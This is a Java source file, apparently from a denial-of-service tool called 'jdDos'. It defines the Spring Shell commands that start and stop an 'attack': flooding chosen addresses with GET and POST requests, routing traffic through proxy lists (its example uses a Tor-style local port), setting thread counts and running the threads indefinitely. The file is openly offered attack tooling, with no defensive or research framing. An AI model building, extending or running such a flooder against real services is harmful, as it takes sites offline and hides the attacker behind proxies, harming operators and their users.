package gh.sep.attacks.jdDos;

import gh.sep.attacks.jdDos.entity.RequestProxy;
import gh.sep.attacks.jdDos.thread.RequestThreadGroupRunner;
import gh.sep.attacks.jdDos.thread.RequestThreadGroupRunnersBuilder;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.shell.standard.ShellComponent;
import org.springframework.shell.standard.ShellMethod;
import org.springframework.shell.standard.ShellOption;

import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

@ShellComponent
public class Commands {
    Logger logger = LoggerFactory.getLogger(Commands.class);
    private final RequestThreadGroupRunnersBuilder requestThreadGroupRunnersBuilder;
    private final AtomicReference<List<RequestThreadGroupRunner>> threadGroupesReference;
    private volatile boolean isStarted = false;

    public Commands(RequestThreadGroupRunnersBuilder requestThreadGroupRunnersBuilder, AtomicReference<List<RequestThreadGroupRunner>> threadGroupesReference) {
        this.requestThreadGroupRunnersBuilder = requestThreadGroupRunnersBuilder;
        this.threadGroupesReference = threadGroupesReference;
    }

    @ShellMethod("Runs jdDos attack")
    public void start(){
        List<RequestThreadGroupRunner> requestThreadGroupRunnerList = requestThreadGroupRunnersBuilder.make();
        for(RequestThreadGroupRunner requestThreadGroupRunner: requestThreadGroupRunnerList){
            requestThreadGroupRunner.start();
        }
        threadGroupesReference.set(requestThreadGroupRunnerList);
        isStarted = true;
        logger.info("Attack started");
    }

    @ShellMethod("Explains current config")
    public void explain(){
        requestThreadGroupRunnersBuilder.explain();
    }

    @ShellMethod("Stops jdDos attack")
    public void stop(){
        isStarted = false;
        List<RequestThreadGroupRunner> requestThreadGroupRunners = threadGroupesReference.get();
        if(requestThreadGroupRunners != null){
            logger.info("Stoping threads");
            for(RequestThreadGroupRunner requestThreadGroupRunner: requestThreadGroupRunners)
                requestThreadGroupRunner.end();
        }
        System.gc();
    }

    @ShellMethod("Adds get request for attack")
    public void addGetRequest(String address){
        if(isStarted)
            logger.warn("New requests wont effect running attack. You must restart attack");
        requestThreadGroupRunnersBuilder.addGetRequestAddress(address);
        logger.info("done");
    }

    @ShellMethod("Adds header")
    public void addHeader(String key, String value){
        requestThreadGroupRunnersBuilder.addHeader(key, value);
        logger.info("done");
    }

    @ShellMethod("Reads proxy list from url")
    public void readProxyList(String address){
        if(isStarted)
            logger.warn("New proxies wont effect running attack.");
        requestThreadGroupRunnersBuilder.readProxiesFromUrl(address);
        logger.info("done");
    }

    @ShellMethod("Adds post request for attack")
    public void addPostRequest(String address, String data){
        if(isStarted)
            logger.warn("New requests wont effect running attack. you must restart attack");
        requestThreadGroupRunnersBuilder.addPostRequest(address, data);
        logger.info("done");
    }

    @ShellMethod("Adds proxy - example => 127.0.0.1:9050")
    public void addProxy(String proxy){
        if(isStarted)
            logger.warn("You cant add proxies to currently running jdDos! Do a restart");
        String[] split = proxy.split(":");
        requestThreadGroupRunnersBuilder.addRequestProxy(new RequestProxy(split[0], Integer.valueOf(split[1])));
        logger.info("done");
    }

    @ShellMethod("Makes infinite running threads, default is false")
    public void running(@ShellOption(arity=1, defaultValue="false") boolean infinite){
        requestThreadGroupRunnersBuilder.setInfinite(infinite);
        logger.info("done");
    }

    @ShellMethod("Sets exact sleep time between infinte loop of each thread. Default = 0 (Random sleep time)")
    public void setSleep(int sleep){
        requestThreadGroupRunnersBuilder.setSleep(sleep);
        logger.info("done");
    }

    @ShellMethod("Sets threads count")
    public void threads(int count){
        requestThreadGroupRunnersBuilder.setThreadsCount(count);
        logger.info("done");
    }

    @ShellMethod("Cleans attack settings")
    public void clean(){
        requestThreadGroupRunnersBuilder.clean();
        logger.info("done");
    }
}
